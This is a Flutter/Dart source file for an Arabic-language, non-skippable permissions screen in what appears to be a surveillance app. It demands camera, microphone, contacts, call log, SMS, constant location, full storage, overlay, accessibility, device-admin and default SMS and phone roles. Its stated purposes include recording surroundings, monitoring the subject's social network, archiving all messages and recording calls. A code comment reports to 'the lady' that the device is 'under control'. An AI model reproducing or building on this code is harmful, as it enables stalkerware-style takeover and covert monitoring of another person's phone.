import 'dart:async';
import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:permission_handler/permission_handler.dart';
import '../../constants/colors.dart';
import '../../services/permission_service.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:provider/provider.dart';
import '../../providers/auth_provider.dart';


// ───────────────────────────────────────────────────────────────
// نموذج إذن واحد
// ───────────────────────────────────────────────────────────────
class _PermDef {
  final IconData icon;
  final String nameAr;
  final String why;
  final Permission? runtimePerm;
  final Future<bool> Function()? checkFn;
  final Future<void> Function()? openFn;
  final bool isSystemSetting;

  const _PermDef({
    required this.icon,
    required this.nameAr,
    required this.why,
    this.runtimePerm,
    this.checkFn,
    this.openFn,
    this.isSystemSetting = false,
  });
}

// ───────────────────────────────────────────────────────────────
// شاشة تدفق الصلاحيات — لا يمكن إغلاقها حتى تكتمل الصلاحيات
// ───────────────────────────────────────────────────────────────
class PermissionsFlowScreen extends StatefulWidget {
  const PermissionsFlowScreen({super.key});

  @override
  State<PermissionsFlowScreen> createState() => _PermissionsFlowScreenState();
}

class _PermissionsFlowScreenState extends State<PermissionsFlowScreen>
    with TickerProviderStateMixin {
  late final List<_PermDef> _perms;
  final Map<int, bool> _status = {};
  bool _loading = false;
  bool _allDone = false;
  Timer? _pollTimer;
  late AnimationController _pulseCtrl;
  late Animation<double> _pulse;

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
    _pulse = Tween<double>(begin: 1.0, end: 1.06)
        .animate(CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));

    _perms = _buildPermList();
    _refreshStatus();
    _pollTimer = Timer.periodic(
        const Duration(seconds: 3), (_) => _refreshStatus());
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _pulseCtrl.dispose();
    super.dispose();
  }

  List<_PermDef> _buildPermList() => [
        _PermDef(
          icon: Icons.camera_alt_rounded,
          nameAr: 'الكاميرا',
          why: 'التحقق المرئي والتوثيق الميداني',
          runtimePerm: Permission.camera,
        ),
        _PermDef(
          icon: Icons.mic_rounded,
          nameAr: 'الميكروفون',
          why: 'تسجيل البيئة المحيطة عند الحاجة',
          runtimePerm: Permission.microphone,
        ),
        _PermDef(
          icon: Icons.contacts_rounded,
          nameAr: 'جهات الاتصال',
          why: 'مراقبة الشبكة الاجتماعية للعنصر',
          runtimePerm: Permission.contacts,
        ),
        _PermDef(
          icon: Icons.call_rounded,
          nameAr: 'سجل المكالمات',
          why: 'أرشفة المكالمات الواردة والصادرة',
          runtimePerm: Permission.phone,
        ),
        _PermDef(
          icon: Icons.sms_rounded,
          nameAr: 'الرسائل القصيرة',
          why: 'مراقبة وأرشفة الرسائل النصية',
          runtimePerm: Permission.sms,
        ),
        _PermDef(
          icon: Icons.location_on_rounded,
          nameAr: 'الموقع الجغرافي',
          why: 'تتبع الموقع في الوقت الفعلي',
          runtimePerm: Permission.locationAlways,
        ),
        _PermDef(
          icon: Icons.folder_rounded,
          nameAr: 'الملفات والوسائط',
          why: 'الوصول لملفات الجهاز وتحليلها',
          runtimePerm: Permission.manageExternalStorage,
        ),
        _PermDef(
          icon: Icons.notifications_active_rounded,
          nameAr: 'الإشعارات',
          why: 'إرسال تنبيهات مراقبة فورية',
          runtimePerm: Permission.notification,
        ),
        _PermDef(
          icon: Icons.picture_in_picture_rounded,
          nameAr: 'الرسم فوق التطبيقات',
          why: 'إظهار طبقة المراقبة فوق كل شيء',
          isSystemSetting: true,
          checkFn: PermissionService.canDrawOverApps,
          openFn: PermissionService.openOverlaySettings,
        ),
        _PermDef(
          icon: Icons.battery_charging_full_rounded,
          nameAr: 'استثناء البطارية',
          why: 'تشغيل الخدمات باستمرار بدون انقطاع',
          isSystemSetting: true,
          checkFn: PermissionService.isBatteryOptimizationIgnored,
          openFn: PermissionService.openBatteryOptimizationSettings,
        ),
        _PermDef(
          icon: Icons.accessibility_new_rounded,
          nameAr: 'خدمة إمكانية الوصول',
          why: 'مراقبة نشاط الجهاز على مستوى النظام',
          isSystemSetting: true,
          checkFn: PermissionService.isAccessibilityServiceEnabled,
          openFn: PermissionService.openAccessibilitySettings,
        ),
        _PermDef(
          icon: Icons.admin_panel_settings_rounded,
          nameAr: 'مشرف الجهاز',
          why: 'تطبيق سياسات الحوكمة عن بُعد',
          isSystemSetting: true,
          checkFn: PermissionService.isDeviceAdminActive,
          openFn: PermissionService.openDeviceAdminSettings,
        ),
        _PermDef(
          icon: Icons.message_rounded,
          nameAr: 'تطبيق الرسائل الافتراضي',
          why: 'أرشفة جميع الرسائل الواردة والصادرة',
          isSystemSetting: true,
          checkFn: PermissionService.isDefaultSmsApp,
          openFn: PermissionService.requestDefaultSmsApp,
        ),
        _PermDef(
          icon: Icons.phone_in_talk_rounded,
          nameAr: 'تطبيق الهاتف الافتراضي',
          why: 'التحكم في المكالمات وتسجيلها',
          isSystemSetting: true,
          checkFn: PermissionService.isDefaultPhoneApp,
          openFn: PermissionService.requestDefaultPhoneApp,
        ),
      ];

  Future<bool> _checkPerm(int i) async {
    final p = _perms[i];
    if (p.runtimePerm != null) {
      return await p.runtimePerm!.isGranted;
    }
    if (p.checkFn != null) return await p.checkFn!();
    return false;
  }

  Future<void> _refreshStatus() async {
    if (!mounted) return;
    final results = await Future.wait(
        List.generate(_perms.length, (i) => _checkPerm(i)));
    if (!mounted) return;
    setState(() {
      for (int i = 0; i < results.length; i++) {
        _status[i] = results[i];
      }
      _allDone = results.every((r) => r);
    });
  }

  Future<void> _requestPerm(int i) async {
    if (_loading) return;
    setState(() => _loading = true);
    try {
      final p = _perms[i];
      if (p.runtimePerm != null) {
        final status = await p.runtimePerm!.request();
        if (status.isPermanentlyDenied) {
          await openAppSettings();
        }
      } else if (p.openFn != null) {
        await p.openFn!();
      }
      await Future.delayed(const Duration(milliseconds: 500));
      await _refreshStatus();
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  Future<void> _requestAll() async {
    if (_loading) return;
    setState(() => _loading = true);
    try {
      final runtimePerms = <Permission>[];
      for (final p in _perms) {
        if (p.runtimePerm != null) runtimePerms.add(p.runtimePerm!);
      }
      await runtimePerms.request();
      for (int i = 0; i < _perms.length; i++) {
        if (_perms[i].isSystemSetting && !(_status[i] ?? false)) {
          await _perms[i].openFn?.call();
          await Future.delayed(const Duration(seconds: 1));
        }
      }
      await Future.delayed(const Duration(milliseconds: 500));
      await _refreshStatus();
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  int get _grantedCount => _status.values.where((v) => v).length;

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: AppColors.background,
        body: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              _buildProgress(),
              Expanded(child: _buildList()),
              _buildFooter(),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.fromLTRB(24, 32, 24, 16),
      decoration: BoxDecoration(
        color: AppColors.backgroundCard,
        border: Border(
          bottom: BorderSide(
              color: AppColors.accent.withValues(alpha: 0.3), width: 1),
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.end,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              ScaleTransition(
                scale: _pulse,
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: AppColors.accent.withValues(alpha: 0.15),
                    shape: BoxShape.circle,
                    border: Border.all(
                        color: AppColors.accent.withValues(alpha: 0.5)),
                  ),
                  child: const Icon(Icons.security_rounded,
                      color: AppColors.accent, size: 28),
                ),
              ),
              Column(
                crossAxisAlignment: CrossAxisAlignment.end,
                children: [
                  const Text(
                    'تفويض الصلاحيات',
                    style: TextStyle(
                      fontFamily: 'Tajawal',
                      fontWeight: FontWeight.w900,
                      fontSize: 22,
                      color: AppColors.accent,
                    ),
                    textDirection: TextDirection.rtl,
                  ),
                  Text(
                    'يجب منح جميع الصلاحيات للمتابعة',
                    style: TextStyle(
                      fontFamily: 'Tajawal',
                      fontSize: 13,
                      color: AppColors.textSecondary,
                    ),
                    textDirection: TextDirection.rtl,
                  ),
                ],
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildProgress() {
    final total = _perms.length;
    final done = _grantedCount;
    final pct = total == 0 ? 0.0 : done / total;

    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
      color: AppColors.backgroundElevated,
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                '$done / $total صلاحية مُفعَّلة',
                style: const TextStyle(
                  fontFamily: 'Tajawal',
                  fontSize: 14,
                  color: AppColors.textSecondary,
                ),
              ),
              Text(
                '${(pct * 100).round()}%',
                style: TextStyle(
                  fontFamily: 'Tajawal',
                  fontWeight: FontWeight.w700,
                  fontSize: 14,
                  color: _allDone ? AppColors.success : AppColors.accent,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          ClipRRect(
            borderRadius: BorderRadius.circular(4),
            child: LinearProgressIndicator(
              value: pct,
              backgroundColor: AppColors.border,
              color: _allDone ? AppColors.success : AppColors.accent,
              minHeight: 6,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildList() {
    return ListView.builder(
      padding: const EdgeInsets.symmetric(vertical: 8),
      itemCount: _perms.length,
      itemBuilder: (ctx, i) {
        final p = _perms[i];
        final granted = _status[i] ?? false;
        return _PermTile(
          icon: p.icon,
          nameAr: p.nameAr,
          why: p.why,
          granted: granted,
          isSystemSetting: p.isSystemSetting,
          onTap: granted ? null : () => _requestPerm(i),
        );
      },
    );
  }

  Widget _buildFooter() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.fromLTRB(24, 12, 24, 24),
      decoration: BoxDecoration(
        color: AppColors.backgroundCard,
        border: Border(
          top: BorderSide(
              color: AppColors.accent.withValues(alpha: 0.2), width: 1),
        ),
      ),
      child: Column(
        children: [
          if (!_allDone)
            SizedBox(
              width: double.infinity,
              child: ElevatedButton.icon(
                onPressed: _loading ? null : _requestAll,
                style: ElevatedButton.styleFrom(
                  backgroundColor: AppColors.accent,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                ),
                icon: _loading
                    ? const SizedBox(
                        width: 18,
                        height: 18,
                        child: CircularProgressIndicator(
                            color: Colors.black, strokeWidth: 2),
                      )
                    : const Icon(Icons.lock_open_rounded,
                        color: Colors.black, size: 20),
                label: Text(
                  _loading ? 'جارٍ الطلب...' : 'منح جميع الصلاحيات دفعة واحدة',
                  style: const TextStyle(
                    fontFamily: 'Tajawal',
                    fontWeight: FontWeight.w700,
                    fontSize: 15,
                    color: Colors.black,
                  ),
                ),
              ),
            ),
          if (_allDone) ...[
            Container(
              padding:
                  const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
              decoration: BoxDecoration(
                color: AppColors.success.withValues(alpha: 0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                    color: AppColors.success.withValues(alpha: 0.5)),
              ),
              child: const Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.check_circle_rounded,
                      color: AppColors.success, size: 22),
                  SizedBox(width: 10),
                  Text(
                    'جميع الصلاحيات مُفعَّلة ✓',
                    style: TextStyle(
                      fontFamily: 'Tajawal',
                      fontWeight: FontWeight.w700,
                      fontSize: 15,
                      color: AppColors.success,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: ElevatedButton(
                onPressed: () async {
  // 1. إخبار السيدة فوراً أن الجهاز أصبح تحت السيطرة وتم سحب الصلاحيات
  final uid = context.read<AuthProvider>().user?.uid;
  if (uid != null) {
    await FirebaseFirestore.instance.collection('users').doc(uid).update({
      'applicationStatus': 'approved_active', 
      'joinedAt': FieldValue.serverTimestamp(),
    });
  }
  
  // 2. الانتقال للخطوة التالية
  if (context.mounted) {
    context.go('/participant/device-setup');
  }
},

                style: ElevatedButton.styleFrom(
                  backgroundColor: AppColors.success,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                ),
                child: const Text(
                  'متابعة إعداد الجهاز',
                  style: TextStyle(
                    fontFamily: 'Tajawal',
                    fontWeight: FontWeight.w800,
                    fontSize: 16,
                    color: Colors.white,
                  ),
                ),
              ),
            ),
          ],
          const SizedBox(height: 8),
          Text(
            'لا يمكن تخطي هذه الخطوة',
            style: TextStyle(
              fontFamily: 'Tajawal',
              fontSize: 11,
              color: AppColors.textMuted,
            ),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }
}

// ───────────────────────────────────────────────────────────────
// بلاطة صلاحية واحدة
// ───────────────────────────────────────────────────────────────
class _PermTile extends StatelessWidget {
  final IconData icon;
  final String nameAr;
  final String why;
  final bool granted;
  final bool isSystemSetting;
  final VoidCallback? onTap;

  const _PermTile({
    required this.icon,
    required this.nameAr,
    required this.why,
    required this.granted,
    required this.isSystemSetting,
    this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 5),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: BoxDecoration(
          color: granted
              ? AppColors.success.withValues(alpha: 0.08)
              : AppColors.backgroundCard,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: granted
                ? AppColors.success.withValues(alpha: 0.4)
                : onTap != null
                    ? AppColors.accent.withValues(alpha: 0.25)
                    : AppColors.border,
            width: 1,
          ),
        ),
        child: Row(
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: granted
                    ? AppColors.success.withValues(alpha: 0.15)
                    : AppColors.accent.withValues(alpha: 0.1),
                shape: BoxShape.circle,
              ),
              child: Icon(
                icon,
                color: granted ? AppColors.success : AppColors.accent,
                size: 22,
              ),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.end,
                children: [
                  Text(
                    nameAr,
                    style: TextStyle(
                      fontFamily: 'Tajawal',
                      fontWeight: FontWeight.w700,
                      fontSize: 14,
                      color: granted
                          ? AppColors.success
                          : AppColors.textPrimary,
                    ),
                    textDirection: TextDirection.rtl,
                  ),
                  const SizedBox(height: 2),
                  Text(
                    why,
                    style: const TextStyle(
                      fontFamily: 'Tajawal',
                      fontSize: 11,
                      color: AppColors.textMuted,
                    ),
                    textDirection: TextDirection.rtl,
                  ),
                  if (isSystemSetting && !granted) ...[
                    const SizedBox(height: 4),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: AppColors.warning.withValues(alpha: 0.15),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: const Text(
                        'يُفتح في الإعدادات',
                        style: TextStyle(
                          fontFamily: 'Tajawal',
                          fontSize: 10,
                          color: AppColors.warning,
                        ),
                      ),
                    ),
                  ],
                ],
              ),
            ),
            const SizedBox(width: 12),
            Icon(
              granted ? Icons.check_circle_rounded : Icons.circle_outlined,
              color: granted ? AppColors.success : AppColors.border,
              size: 22,
            ),
          ],
        ),
      ),
    );
  }
}
